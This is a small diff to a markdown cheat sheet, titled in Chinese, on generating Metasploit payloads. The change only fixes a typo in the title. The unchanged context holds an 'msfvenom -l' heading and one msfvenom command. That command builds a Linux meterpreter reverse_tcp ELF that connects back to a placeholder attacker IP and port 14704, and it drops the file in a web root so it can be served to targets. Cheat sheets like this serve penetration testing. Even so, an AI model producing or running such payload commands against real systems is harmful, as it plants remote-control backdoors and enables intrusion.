@@ -1,4 +1,4 @@
-# msfs生成各种payload
+# msf生成各种payload
 ## msfvencom -l
 #### Linux
 `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=14704 -f elf >/var/www/html/shell.elf`
